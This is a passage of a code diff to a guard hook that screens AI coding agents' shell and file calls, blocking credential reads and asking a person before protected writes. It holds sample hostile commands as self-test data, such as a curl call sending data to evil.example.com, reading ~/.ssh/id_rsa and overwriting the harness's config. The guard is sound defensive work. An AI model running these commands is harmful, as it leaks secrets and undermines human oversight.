@@ -12,26 +12,35 @@ gated command is not blocked. `bash -c "…"` is opened and judged inside; wrapp
 are peeled. It decides:
 
   deny  — never from an agent, even with a yes: what would put a credential in the chat (credential files and
-          folders, the keychain, `.env` files, private keys, the project's SECRET_FILES and DENY_COMMANDS);
+          folders, the keychain, `.env` files, private keys, the project's SECRET_FILES) and the project's
+          DENY_COMMANDS — those, and commands that change a device for good, such as burning an eFuse;
+  deny until corrected — a call the agent mends itself, after asking the person: a new skill or agent written with
+          no `scope:` of `portable` or `project` in its frontmatter (the corrected call is then asked), and a file
+          the project's NEEDS_DOC holds until a doc exists — a new ESP-IDF project while docs/ has no hardware spec;
   ask   — needs the person: a commit, a push, discarding changes, deleting files outside the temp directories,
           skipping or moving the git hooks, sending data off the machine or fetching from a host outside
           ALLOWED_HOSTS, writing generated or managed files, a branch switch or merge that rewrites the kit, editing
-          the harness itself, and the project's ASK_COMMANDS;
+          the harness itself, creating a skill or agent (its prompt names the scope it will carry, or asks for one),
+          a NEEDS_DOC file written from the shell, and the project's ASK_COMMANDS — flashing a board among them;
   allow — everything else, with no output: reading, building, testing, running the app.
 
 For Codex an ask becomes a deny that says to ask the person: Codex parses "ask" but does not act on it.
 
 Files are judged when written through the edit tools, apply_patch, a shell redirect (`>`, `>>`, `tee`) or a
-`cp`/`mv`/`ln`/`install`/`rsync` destination; `sed -i`, `touch`, `dd` and scripts are not followed. A heredoc's body
-is data, unless it is fed to bash, sh or zsh. A guard that crashes lets the call through (both agents treat a hook
-error as non-blocking) and says why on stderr; `verify.py doctor` runs the self-test. It catches accidents, not an
-agent set on getting round it; the pre-commit hook and the person's review stay behind it.
+`cp`/`mv`/`ln`/`install`/`rsync` destination, `sed` or `perl` in place on the file, or an inline script (any
+interpreter by name, path or `$PY`) that names the file in quotes and makes a known write call — read as text, so a
+path built in the script, a script kept in a file, an unknown write call and a `cd` before the write are not
+followed; nor are `touch` and `dd`. A NUL ends a path, as for the shell; the harness paths match ignoring case. A
+heredoc's body is otherwise data, unless it is fed to bash, sh or zsh. A guard that crashes lets the call through
+(both agents treat a hook error as non-blocking) and says why on stderr; `verify.py doctor` runs the self-test. It
+catches accidents, not an agent set on getting round it; the pre-commit hook and the person's review stay behind it.
 
 The project's facts — secrets, hosts, gates, generated paths — come from .agents/project.py.
 """
 
 from __future__ import annotations
 
+import fnmatch
 import json
 import os
 import re
@@ -47,7 +56,7 @@ import project  # noqa: E402 — the project's facts: .agents/project.py
 TEMP_DIRS = ("/tmp/", "/private/tmp/", "/var/folders/", "/private/var/folders/")
 OPERATORS = {"&&", "||", ";", ";;", "|", "|&", "&", "(", ")"}
 REDIRECTS = {">", ">>", ">|", "&>", "&>>"}
-WRAPPERS = {"sudo", "command", "exec", "time", "nohup", "env", "xargs", "npx", "bunx", "pipx"}
+WRAPPERS = {"sudo", "command", "exec", "time", "nohup", "env", "xargs", "npx", "bunx", "pipx", "uvx"}
 # A runner and its subcommand that run the program after them: `uv run x`, `poetry run x`, `npm exec x`.
 RUNNERS = {("uv", "run"), ("poetry", "run"), ("pipenv", "run"), ("bundle", "exec"), ("npm", "exec"),
            ("pnpm", "exec"), ("yarn", "dlx"), ("pnpm", "dlx"), ("pipx", "run"), ("hatch", "run"), ("pdm", "run")}
@@ -154,19 +163,27 @@ def segments(command: str):
 
 def unwrap(words: list[str]):
     while words:
-        if words[0] in WRAPPERS or re.match(r"[A-Za-z_]\w*=", words[0]):
+        if len(words) > 1 and (os.path.basename(words[0]), words[1]) in RUNNERS:  # before WRAPPERS: `pipx run x`
+            words = words[2:]
+        elif words[0] == "timeout":  # `timeout [-s SIG] [-k DUR] DUR cmd`
+            words = words[1:]
+            while words and words[0].startswith("-"):
+                words = words[2:] if words[0] in ("-s", "-k", "--signal", "--kill-after") else words[1:]
+            words = words[1:]  # the duration
+        elif words[0] in WRAPPERS or re.match(r"[A-Za-z_]\w*=", words[0]):
             words = words[1:]
             while words and words[0].startswith("-"):  # `npx -y x`, `env -i x`, `sudo -u u x` (its value stays)
                 words = words[1:]
-        elif len(words) > 1 and (os.path.basename(words[0]), words[1]) in RUNNERS:
-            words = words[2:]
         else:
             break
     if not words:
         return
     prog = os.path.basename(words[0])
-    if prog in ("bash", "sh", "zsh") and "-c" in words[:-1]:
-        yield from segments(words[words.index("-c") + 1])
+    # `-c` alone or in a cluster of short flags: `bash -c`, `bash -lc`, `sh -ec`
+    flag = next((i for i, w in enumerate(words[1:-1], 1) if re.fullmatch(r"-[A-Za-z]*c[A-Za-z]*", w)), None)
+    script = next((w for w in words[flag + 1:] if not w.startswith("-")), None) if flag is not None else None
+    if prog in ("bash", "sh", "zsh") and script is not None:  # the first word after the flags: `bash -c -l "…"`
+        yield from segments(script)
     else:
         yield words
 
@@ -186,7 +203,9 @@ def program(words: list[str]) -> tuple[str, list[str]]:
 # --- the policy ----------------------------------------------------------------------------------------------
 
 def repo_path(path: str, cwd: str) -> str | None:
-    """The path relative to the repo root, or None outside the repo."""
+    """The path relative to the repo root, or None outside the repo. A NUL ends the path, as it does for the shell —
+    and the guard never crashes on one, since a crash lets the call through."""
+    path = path.split("\x00")[0]
     full = Path(os.path.realpath(os.path.join(cwd, os.path.expanduser(path))))
     try:
         return full.relative_to(ROOT.resolve()).as_posix()
@@ -194,13 +213,21 @@ def repo_path(path: str, cwd: str) -> str | None:
         return None
 
 
-def check_path(path: str, cwd: str) -> tuple[str, str] | None:
-    """Writing this path needs the person: the harness, a generated or a managed file."""
+def check_path(path: str, cwd: str, shell: bool = True) -> tuple[str, str] | None:
+    """Writing this path needs the person: the harness, a generated or a managed file. `shell` is a write whose
+    content cannot be read; the edit tools' content is judged before this, in decide()."""
     rel = repo_path(path, cwd)
     if rel is None:
         return None
+    if unit := new_unit(path, cwd, folder=True):  # created from the shell, where the content cannot be read
+        return "ask", f"Needs the person's yes to create the {unit[0]} `{unit[1]}`: {SCOPE_QUESTION}."
+    folded = rel.casefold()  # a case-insensitive disk takes `.AGENTS/project.py` for `.agents/project.py`
+    if UNIT_FOLDERS.match(folded):
+        return "ask", f"Needs the person's yes to add to {rel}: a new skill's or agent's {SCOPE_QUESTION}."
+    if shell and not os.path.exists(ROOT / rel) and (why := needs_doc(rel, None)):  # content unread
+        return "ask", f"Needs the person's yes to create {rel}: {why} (HARNESS §2.2)."
     for prefix, why in HARNESS_PATHS:
-        if rel == prefix or (prefix.endswith("/") and rel.startswith(prefix)):
+        if folded == prefix or (prefix.endswith("/") and folded.startswith(prefix)):
             return "ask", f"Needs the person's yes to edit {rel}: {why}."
     if project.matches(rel, project.GENERATED):
         return "ask", f"Needs the person's yes to edit {rel}: a build or a tool writes it."
@@ -210,6 +237,7 @@ def check_path(path: str, cwd: str) -> tuple[str, str] | None:
 
 
 def is_secret(path: str, cwd: str) -> bool:
+    path = path.split("\x00")[0]  # a NUL ends the path, as for the shell; never a crash, which would let the call by
     full = os.path.realpath(os.path.join(cwd, os.path.expandvars(os.path.expanduser(path))))
     for s in SECRET_PATHS:
         sp = os.path.realpath(os.path.expanduser(s))
@@ -312,12 +340,62 @@ def check_rm(args: list[str], cwd: str) -> tuple[str, str] | None:
     return None
 
 
+def is_glob(word: str) -> bool:
+    return any(c in word for c in "*?[")
+
+
+def word_in(word, args: list[str]) -> bool:
+    """A project gate's word among the arguments: a tuple is any of its alternatives; a glob (`*`, `?`, `[`) is
+    matched whole against each argument, so `write[_-]flash` takes both spellings and never `write.bin`."""
+    alts = word if isinstance(word, tuple) else (word,)
+    return any(any(fnmatch.fnmatchcase(a, w) for a in args) if is_glob(w) else w in args for w in alts)
+
+
 def check_project(prog: str, args: list[str]) -> tuple[str, str] | None:
-    """The project's own gates, from .agents/project.py."""
+    """The project's own gates, from .agents/project.py. A program may be a glob (`esptool*`); a word may be a glob or
+    a tuple of alternatives, for a tool that spells one command several ways (`burn_efuse`, `burn-efuse`)."""
     for table, decide in ((project.DENY_COMMANDS, deny), (project.ASK_COMMANDS, ask)):
         for name, words, why in table:
-            if prog == name and all(w in args for w in words):
+            if (fnmatch.fnmatchcase(prog, name) if is_glob(name) else prog == name) and all(
+                    word_in(w, args) for w in words):
                 return decide(why)
+    return None
+
+
+def needs_doc(rel: str, content: str | None, root: Path | None = None) -> str | None:
+    """A file the project makes only once a doc exists (NEEDS_DOC in project.py), written while no doc in docs/
+    matches: what to ask. `content` None means it cannot be read — a shell write: a file whose rule looks at its
+    content is then not judged. A template's `<…>` placeholder never counts as the doc holding the pattern."""
+    root = root or ROOT
+    for rule in getattr(project, "NEEDS_DOC", []):
+        for path, pattern in rule["files"].items():
+            if rel.casefold() != path.casefold():
+                continue
+            if pattern and (content is None or not re.search(pattern, content)):
+                continue
+            names, holds = rule["doc"]
+            for doc in (root / "docs").rglob("*.md"):
+                if any(fnmatch.fnmatch(doc.name.lower(), n.lower()) for n in names):
+                    try:
+                        text = re.sub(r"<[^<>\n]*>", "", doc.read_text(errors="replace"))
+                    except OSError:
+                        continue
+                    if re.search(holds, text, re.I):
+                        return None
+            return rule["ask"]
+    return None
+
+
+def check_needs_doc(tool: str, args: dict, paths: list[str], cwd: str) -> tuple[str, str] | None:
+    """Writing a file NEEDS_DOC holds, with the edit tools: denied until the doc exists."""
+    bodies = patch_bodies(patch_text(args)) if tool == "apply_patch" else {}
+    for p in paths:
+        rel = repo_path(p, cwd)
+        if rel is None or os.path.exists(ROOT / rel):
+            continue
+        content = args.get("content") if tool == "Write" else bodies.get(p, "")
+        if why := needs_doc(rel, content if isinstance(content, str) else ""):
+            return "deny", f"Blocked by the harness guard: {why} (HARNESS §2.2)."
     return None
 
 
@@ -347,18 +425,168 @@ def check_segment(words: list[str], cwd: str) -> tuple[str, str] | None:
     return None
 
 
+# An interpreter by name, with or without a path in front (`.venv/bin/python`, `/usr/bin/env node`), inside `$(…)` or
+# backticks, or as a variable (`$PY`); followed by a space, a quote, `;`, `)`, a backtick or the end, so
+# `node_modules/` and `nodes.txt` do not count.
+INTERPRETER = re.compile(r"(?:^|[^\w.-])(?:python[0-9.]*|ipython|node|tsx|ts-node|ruby|perl|php|deno|bun)"
+                         r"(?=[\s\"';)`]|$)|\$\{?PY(?:THON)?\}?", re.M)
+SCRIPT_WRITE = re.compile(
+    r"open\([^)]{0,200}?['\"](?:[wax]|r\+)[+tb]*['\"]"                       # Python open(…, 'w' | 'a' | 'x' | 'r+')
+    r"|\.write_(?:text|bytes)\(|\.touch\(|\bos\.(?:remove|unlink|rename|replace|truncate|chmod|symlink|makedirs|mkdir"
+    r"|rmdir|removedirs)\(|\bshutil\.(?:copy\w*|move|rmtree)\("
+    r"|\bfs\.(?:promises\.)?(?:writeFile|appendFile|unlink|rm|rename|copyFile|mkdir|symlink|createWriteStream)(?:Sync)?\("
+    r"|\.(?:writeFile|appendFile|unlink|rm|rename|copyFile|mkdir|symlink)(?:Sync)?\(|\.createWriteStream\("
+    r"|\b(?:writeFile|appendFile)(?:Sync)?\(|\b(?:File|IO)\.(?:write|delete)\(|\bfile_put_contents\(|\bunlink\s*\("
+    r"|\bDeno\.writeTextFile(?:Sync)?\(|\bBun\.write\(|\bopen\s*\(?\s*\w+\s*,\s*['\"]\s*\+?>")  # perl open(F, ">" / ">>")
+QUOTED = re.compile(r"""(?=(['"`])([^'"`\s]{1,300})\1)""")  # overlapping, so `"open("…"` cannot hide a path
+
+
+def in_place(prog: str, args: list[str]) -> bool:
+    """`sed -i`, `sed -Ei`, `sed -i.bak`, `sed --in-place[=…]`; `perl -i`, `perl -pi`, `perl -lpi`, `perl -0pi` — but
+    not a perl `-M`/`-I` argument whose module name happens to hold an `i`."""
+    if prog not in ("sed", "perl"):
+        return False
+    return any(a.startswith("--in-place") or (re.match(r"-[A-Za-z0-9]*i", a) and not a.startswith(("-M", "-I")))
+               for a in args if a.startswith("-"))
+
+
+def check_script_writes(command: str, cwd: str) -> tuple[str, str] | None:
+    """A file the shell cannot see being written: `sed -i`/`perl -i` on a protected path, or an inline script —
+    `python3 - <<EOF`, `python3 -c`, `node -e` — that names a protected path and writes a file. The script is read as
+    text: the path must appear in quotes, and some write call anywhere in the command. So a script that only reads a
+    protected file but writes another, or prose that names all three, also asks; a path built in the script, a script
+    kept in a file, and a `cd` before the write are not followed."""
+    for words in segments(command):
+        prog, args = program(words)
+        if in_place(prog, args):
+            for a in args:
+                if not a.startswith("-") and (r := check_path(a, cwd)):
+                    return r
+    text = command.replace("\\", "")  # escaped quotes read as quotes
+    if INTERPRETER.search(text) and SCRIPT_WRITE.search(text):
+        quoted = (p.lstrip("+<>") for _, p in QUOTED.findall(text))  # perl's ">>file" names file
+        for path in dict.fromkeys(p for p in quoted if "." in p or "/" in p):  # unique, path-like
+            if r := check_path(path, cwd):
+                return r[0], f"{r[1]} — written by a script, which the guard reads only as text"
+    return None
+
+
 def strongest(results) -> tuple[str, str] | None:
     results = [r for r in results if r]
     return next((r for r in results if r[0] == "deny"), results[0] if results else None)
 
 
 def check_command(command: str, cwd: str) -> tuple[str, str] | None:
-    return strongest(check_segment(words, cwd) for words in segments(command))
+    return strongest([check_segment(words, cwd) for words in segments(command)]
+                     + [check_script_writes(command, cwd)])
+
+
+# `(.+)` then strip, not `(.+?)\s*$`: the lazy form backtracks quadratically on a padded line, and a guard that
+# outlasts the hook's timeout lets the call through.
+PATCH_FILE = re.compile(r"^\*\*\* (?:(?:Add|Update|Delete) File|Move to): (.+)$", re.M)
 
 
 def patch_paths(patch: str) -> list[str]:
     """The files a Codex apply_patch touches."""
-    return re.findall(r"^\*\*\* (?:(?:Add|Update|Delete) File|Move to): (.+?)\s*$", patch, re.M)
+    return [p.strip() for p in PATCH_FILE.findall(patch)]
+
+
+def patch_text(args: dict) -> str:
+    """An apply_patch's text; Codex may send it as a list of arguments. Anything else reads as empty."""
+    v = args.get("command") or args.get("patch") or ""
+    if isinstance(v, list):
+        v = "\n".join(x for x in v if isinstance(x, str))
+    return v if isinstance(v, str) else ""
+
+
+def patch_bodies(patch: str) -> dict[str, str]:
+    """Each file's added lines in an apply_patch, kept apart — one file's text never speaks for another's. A
+    `Move to:` takes the hunks that follow it."""
+    bodies: dict[str, list[str]] = {}
+    current = None
+    for line in patch.splitlines():
+        if m := PATCH_FILE.match(line):
+            current = m.group(1).strip()
+            bodies.setdefault(current, [])
+        elif current is not None and line.startswith("+"):
+            bodies[current].append(line[1:])
+    return {p: "\n".join(lines) for p, lines in bodies.items()}
+
+
+# Matched against the case-folded path: on a case-insensitive disk (macOS, Windows) `.AGENTS/agents/x.md` and
+# `skill.md` are the same files. A README beside the agents is not an agent.
+NEW_UNIT = re.compile(r"^(?:\.agents|\.claude)/"
+                      r"(?:skills/([^/]+)/skill\.md|agents/(?!readme\.md$)([^/]+)\.md)$")
+NEW_SKILL_FOLDER = re.compile(r"^(?:\.agents|\.claude)/skills/([^/]+)/?$")
+UNIT_FOLDERS = re.compile(r"^(?:\.agents|\.claude)/(?:skills|agents)/?$")  # `cp -r x .agents/skills/` names no unit
+SCOPE_QUESTION = ("its scope is the person's choice — portable (it works copied into any repo: a skill's folder on its "
+                  "own, an agent with the portable skills it names) or project (it belongs to this repo: it needs the "
+                  "harness kit, or is filled in for this project). Ask them; their answer is its `metadata: scope: "
+                  "<portable|project>` (AGENT_HARNESS §7.3)")
+SCOPE_HOW = "write it in the frontmatter and create the file with Write or apply_patch's Add File"
+
+
+def frontmatter_scope(text: str) -> tuple[str | None, str]:
+    """The scope in the first frontmatter block — top level or under `metadata:`, the value alone on its line — and,
+    when there is none, why: so a deny says what it could not read."""
+    if not isinstance(text, str):
+        return None, "its content could not be read"
+    text = text.lstrip("﻿").replace("\r\n", "\n")
+    fm = re.match(r"---\n(.*?\n)---[ \t]*$", text, re.S | re.M)
+    if not fm:
+        return None, "it has no frontmatter (a `---` block at the top)"
+    value = r"[ \t]*(['\"]?)([A-Za-z_-]+)\1[ \t]*(?:#.*)?$"
+    found = re.findall(r"^scope:" + value, fm.group(1), re.M)
+    if md := re.search(r"^metadata:[ \t]*\n((?:[ \t]+.*\n|[ \t]*\n)*)", fm.group(1), re.M):
+        found += re.findall(r"^[ \t]+scope:" + value, md.group(1), re.M)
+    scopes = {v for _, v in found}
+    if not scopes:
+        return None, "it has no scope yet"
+    if len(scopes) > 1:
+        return None, f"it names more than one scope ({', '.join(sorted(scopes))})"
+    scope = scopes.pop()
+    if scope not in ("portable", "project"):
+        return None, f"its scope `{scope}` is neither portable nor project"
+    return scope, ""
+
+
+def new_unit(path: str, cwd: str, folder: bool = False) -> tuple[str, str] | None:
+    """A skill or agent that does not exist yet: (kind, name). With `folder`, a new skill's folder too — a shell copy
+    of a whole skill."""
+    rel = repo_path(path, cwd)
+    # os.path.exists, not Path.exists: on Python 3.9 the latter raises on a name over 255 bytes, and a crash lets the
+    # call through; this one answers False, so the call is judged as new.
+    if rel is None or os.path.exists(ROOT / rel):
+        return None
+    folded = rel.casefold()
+    if m := NEW_UNIT.match(folded):
+        name = rel.split("/")[2] if m.group(1) else rel.rsplit("/", 1)[1][:-3]
+        return ("skill", name) if m.group(1) else ("agent", name)
+    if folder and NEW_SKILL_FOLDER.match(folded):
+        return "skill", rel.rstrip("/").rsplit("/", 1)[1]
+    return None
+
+
+def check_new_unit(tool: str, args: dict, paths: list[str], cwd: str) -> tuple[str, str] | None:
+    """Creating a skill or agent: denied until it carries the person's choice of scope, then asked with that scope
+    named, so the person confirms it. The guard reads the scope, not who chose it: the ask is where the person does.
+    Every new unit in the call is judged; a deny outweighs an ask."""
+    bodies = patch_bodies(patch_text(args)) if tool == "apply_patch" else {}
+    results = []
+    for p in paths:
+        unit = new_unit(p, cwd)
+        if not unit:
+            continue
+        kind, name = unit
+        text = args.get("content") if tool == "Write" else bodies.get(p, "")
+        scope, why = frontmatter_scope(text)
+        if scope is None:
+            results.append(("deny", f"Blocked by the harness guard: the new {kind} `{name}` — {why}; "
+                                    f"{SCOPE_QUESTION} — {SCOPE_HOW}."))
+        else:
+            results.append(("ask", f"Creating the {kind} `{name}` as `{scope}` — confirm the scope is the person's "
+                                   f"choice (AGENT_HARNESS §7.3)."))
+    return strongest(results)
 
 
 def decide(call: dict) -> tuple[str, str] | None:
@@ -371,7 +599,7 @@ def decide(call: dict) -> tuple[str, str] | None:
             command = shlex.join(command)
         return check_command(command, cwd)
     if tool == "apply_patch":
-        paths = patch_paths(args.get("command", "") or args.get("patch", ""))
+        paths = patch_paths(patch_text(args))
     else:  # Claude Code's Read, Grep, Glob, Edit, Write, MultiEdit, NotebookEdit
         paths = [p for p in (args.get("file_path"), args.get("notebook_path"), args.get("path"),
                              args.get("pattern") if tool == "Glob" else None) if p]
@@ -379,7 +607,11 @@ def decide(call: dict) -> tuple[str, str] | None:
         return gate("secret")
     if tool in ("Read", "Grep", "Glob"):
         return None
-    return strongest(check_path(p, cwd) for p in paths)
+    if unit := check_new_unit(tool, args, paths, cwd):
+        return unit
+    if held := check_needs_doc(tool, args, paths, cwd):
+        return held
+    return strongest(check_path(p, cwd, shell=False) for p in paths)
 
 
 def answer(result: tuple[str, str] | None, agent: str) -> None:
@@ -424,6 +656,42 @@ CASES = [
     ("cp x.json package-lock.json", "ask"),
     ("echo x >> .agents/hooks/guard.py", "ask"),
     ("cp settings.json .claude/settings.json", "ask"),
+    # a script writing a protected file
+    ("sed -i '' 's/a/b/' .agents/skills/verify-change/SKILL.md", "ask"),
+    ("sed -i 's/a/b/' docs/AGENT_HARNESS.md", None),
+    ("perl -pi -e 's/a/b/' .agents/project.py", "ask"),
+    ("python3 - <<'EOF'\np='.agents/skills/verify-change/SKILL.md'\ns=open(p).read()\nopen(p,'w').write(s)\nEOF", "ask"),
+    ("python3 - <<'EOF'\nfrom pathlib import Path\nPath(\".agents/hooks/guard.py\").write_text('x')\nEOF", "ask"),
+    ("python3 -c \"open('build/out.txt','w').write('x')\"", "ask"),
+    ("node -e \"require('fs').writeFileSync('.codex/config.toml','x')\"", "ask"),
+    ("python3 - <<'EOF'\np='DESIGN.md'\nopen(p,'w').write(open(p).read())\nEOF", None),
+    ("python3 -c \"print(open('.agents/project.py').read())\"", None),
+    ("python3 .agents/skills/verify-change/scripts/verify.py run", None),
+    ("python3 .agents/skills/motion/scripts/motion_check.py --test", None),
+    ("python3 .agents/skills/touch-and-gesture/scripts/touch_check.py --test", None),
+    ("cat > .agents/skills/zz-new/SKILL.md <<'EOF'\nx\nEOF", "ask"),  # a new skill from the shell: the scope question
+    ("sed -Ei 's/a/b/' .agents/project.py", "ask"),
+    ("sed -i.bak 's/a/b/' .agents/project.py", "ask"),
+    ("sed --in-place=.bak 's/a/b/' .agents/project.py", "ask"),
+    ("perl -lpi -e 's/a/b/' .agents/project.py", "ask"),
+    ("sed -n 's/a/b/p' .agents/project.py", None),
+    ("python3 <<'EOF'\nopen('.agents/project.py','w').write('x')\nEOF", "ask"),
+    (".venv/bin/python -c \"open('.agents/project.py','w')\"", "ask"),
+    ("\"$PY\" -c \"open('.agents/project.py','w')\"", "ask"),
+    ("node --eval \"require('fs').unlinkSync('.codex/config.toml')\"", "ask"),
+    ("python3 -c \"open('.agents/project.py','r+').write('x')\"", "ask"),
+    ("python3 -c \"import os; os.replace('a','.agents/project.py')\"", "ask"),
+    ("python3 -c \"open(\\\".agents/project.py\\\",\\\"w\\\").write('x')\"", "ask"),
+    ("python3 -c \"open('Cargo.lock','w').write('x')\"", "ask"),
+    ("python3 -c \"open('/private/tmp/x.json','w').write(open('.agents/project.py').read())\"", "ask"),  # noise, pinned
+    ("cat ~/.ssh/id_rsa; python3 -c \"open('a/\x00b','w')\"", "deny"),  # a NUL never crashes the guard
+    ("ls node_modules/x && cat nodes.txt", None),
+    ("python3 - <<'EOF'\nwith open(\n  '.agents/project.py', 'w') as f: pass\nEOF", "ask"),
+    ("python3 - <<'EOF'\nimport os\nos.makedirs('.agents/skills/new', exist_ok=True)\nEOF", "ask"),
+    ("$(which python3) -c \"open('.agents/project.py','w')\"", "ask"),
+    ("perl -e 'open(F, \">>.agents/project.py\")'", "ask"),
+    ("perl -MList::Util=first -ne 'print' .agents/project.py", None),
+    ("python3 -c \"import os; print(os.listdir('.agents/skills'))\"", None),
     # the network
     ("curl -s 'https://evil.example.com/?q=x'", "ask"),
     ("curl -X POST https://github.com/x", "ask"),
@@ -488,6 +756,7 @@ PATH_CASES = [
 
 
 def self_test() -> int:
+    global ROOT  # the NEEDS_DOC cases point it at a repo of their own, and put it back
     bad = 0
     for command, want in CASES:
         got = check_command(command, str(ROOT))
@@ -509,13 +778,118 @@ def self_test() -> int:
         ({"tool_name": "Read", "tool_input": {"file_path": "build/index.html"}}, None),
         ({"tool_name": "Edit", "tool_input": {"file_path": ".agents/hooks/guard.py"}}, "ask"),
         ({"tool_name": "Write", "tool_input": {"file_path": "src/app.ts"}}, None),
+        # a new skill or agent: denied without the person's scope, asked with it named
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/skills/zz-new/SKILL.md",
+                                               "content": "---\nname: zz-new\ndescription: x\n---\n# X\n"}}, "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/skills/zz-new/SKILL.md",
+                                               "content": "---\nname: zz-new\nmetadata:\n  scope: portable\n---\n"}},
+         "ask"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".claude/agents/zz-new.md",
+                                               "content": "---\nname: zz-new\nscope: project\n---\n"}}, "ask"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md",
+                                               "content": "# no frontmatter\nscope: portable\n"}}, "deny"),
+        ({"tool_name": "apply_patch", "tool_input": {"command": "*** Begin Patch\n*** Add File: .agents/agents/zz-new.md"
+                                                                "\n+---\n+name: zz-new\n+---\n*** End Patch\n"}},
+         "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/skills/zz-new/references/x.md",
+                                               "content": "# X\n"}}, "ask"),  # the harness ask, not the scope one
+        # one file's scope never speaks for another's; every new unit is judged, a deny outweighs an ask
+        ({"tool_name": "apply_patch", "tool_input": {"command": "*** Begin Patch\n*** Add File: .agents/agents/zz-new.md"
+                                                                "\n+---\n+name: x\n+---\n*** Add File: src/x.md\n+---\n"
+                                                                "+scope: portable\n+---\n*** End Patch"}}, "deny"),
+        ({"tool_name": "apply_patch", "tool_input": {"command": "*** Begin Patch\n*** Add File: .agents/agents/zz-a.md"
+                                                                "\n+---\n+scope: project\n+---\n*** Add File: "
+                                                                ".agents/agents/zz-b.md\n+---\n+name: b\n+---\n"
+                                                                "*** End Patch"}}, "deny"),
+        ({"tool_name": "apply_patch", "tool_input": {"command": "*** Begin Patch\n*** Update File: x.md\n*** Move to: "
+                                                                ".agents/agents/zz-new.md\n+---\n+scope: project\n+---\n"
+                                                                "*** End Patch"}}, "ask"),
+        ({"tool_name": "apply_patch", "tool_input": {"command": ["apply_patch", "*** Begin Patch\n*** Add File: "
+                                                                 ".agents/agents/zz-new.md\n+x\n*** End Patch"]}},
+         "deny"),
+        # a case variant names the same file on a case-insensitive disk
+        ({"tool_name": "Write", "tool_input": {"file_path": ".AGENTS/agents/zz-new.md", "content": "x"}}, "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/skills/zz-new/skill.md", "content": "x"}},
+         "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".AGENTS/project.py", "content": "x"}}, "ask"),
+        # the frontmatter is read as frontmatter: CRLF and a BOM are fine; a scope in the description, the body, a
+        # value that runs on, or two scopes are not the person's one choice
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md",
+                                               "content": "﻿---\r\nname: n\r\nmetadata:\r\n  scope: project\r\n"
+                                                          "---\r\n"}}, "ask"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md",
+                                               "content": "---\nname: n\ndescription: |\n  scope: portable\n---\n"}},
+         "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md",
+                                               "content": "---\nname: n\n---\n\n---\nscope: project\n---\n"}}, "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md",
+                                               "content": "---\nscope: portable-ish\n---\n"}}, "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md",
+                                               "content": "---\nscope: portable\nmetadata:\n  scope: project\n---\n"}},
+         "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md", "content": None}}, "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/zz-new.md", "content": 123}}, "deny"),
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/README.md", "content": "# x"}}, "ask"),
+        # an existing skill or agent keeps the plain harness ask
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/skills/motion/SKILL.md", "content": "x"}}, "ask"),
+        ({"tool_name": "Edit", "tool_input": {"file_path": ".claude/agents/doc-writer.md"}}, "ask"),
+        ({"tool_name": "Edit", "tool_input": {"file_path": ".agents/agents/zz-new.md"}}, "deny"),
+        ({"tool_name": "Bash", "tool_input": {"command": "cp -r .agents/skills/motion .agents/skills/zz-new"}}, "ask"),
+        ({"tool_name": "Bash", "tool_input": {"command": "cp -r ../other/skills/motion .claude/skills/"}}, "ask"),
+        ({"tool_name": "Bash", "tool_input": {"command": "cp x.md .agents/agents"}}, "ask"),
+        # a name over 255 bytes never crashes the guard (Path.exists raises on Python 3.9)
+        ({"tool_name": "Write", "tool_input": {"file_path": ".agents/agents/" + "a" * 300 + ".md", "content": "x"}},
+         "deny"),
+        ({"tool_name": "Bash", "tool_input": {"command": "echo b > .agents/agents/" + "a" * 300 + ".md"}}, "ask"),
     ] + [({"tool_name": "Read", "tool_input": {"file_path": n}}, "deny") for n in project.SECRET_FILES]
     for call, want in tool_cases:
         got = decide({"cwd": str(ROOT), **call})
         if (got and got[0]) != want:
             bad += 1
             print(f"FAIL  {call['tool_name']} {call['tool_input']}: want {want}, got {got and got[0]}")
-    total = len(CASES) + len(PATH_CASES) + len(tool_cases)
+    # a file NEEDS_DOC holds, against a docs/ of the test's own, so the repo's docs never change the result
+    doc_cases = []
+    if getattr(project, "NEEDS_DOC", None):
+        import tempfile
+        rule = project.NEEDS_DOC[0]
+        first, pattern = next(iter(rule["files"].items()))
+        names, holds = rule["doc"]
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "docs").mkdir()
+            sample = re.sub(r"\\b|\\", "", holds)  # a literal the doc pattern accepts: `\bESP32` → `ESP32`
+            spec = root / "docs" / (names[0].replace("*", "X_") + ".md")
+            match = re.sub(r"\\(.)", r"\1", pattern) if pattern else ""
+            saved, ROOT = ROOT, root  # the whole decision, against the test's own repo
+
+            def held(call: dict):
+                got = decide({"cwd": str(root), **call})
+                return got and got[0]
+
+            def write(content):
+                return {"tool_name": "Write", "tool_input": {"file_path": first, "content": content}}
+
+            patch = {"tool_name": "apply_patch", "tool_input": {
+                "command": f"*** Begin Patch\n*** Add File: {first}\n+{match}\n*** End Patch"}}
+            try:
+                (root / "docs" / "NOTES.md").write_text(f"{sample} named, in a doc not named like the rule's\n")
+                spec.write_text(f"| Chip | `<{sample}>` |\n")  # the template, unfilled: a placeholder only
+                cases = [("Write, no doc", held(write(match)), "deny"), ("apply_patch, no doc", held(patch), "deny"),
+                         ("shell, no doc", (check_path(first, str(root)) or (None,))[0],
+                          "ask" if not pattern else None)]
+                if pattern:
+                    cases.append(("another kind of file", held(write("nothing the rule looks for")), None))
+                spec.write_text(f"| Chip | {sample} |\n")
+                cases += [("Write, the doc filled in", held(write(match)), None),
+                          ("apply_patch, the doc filled in", held(patch), None)]
+            finally:
+                ROOT = saved
+            for name, got, want in cases:
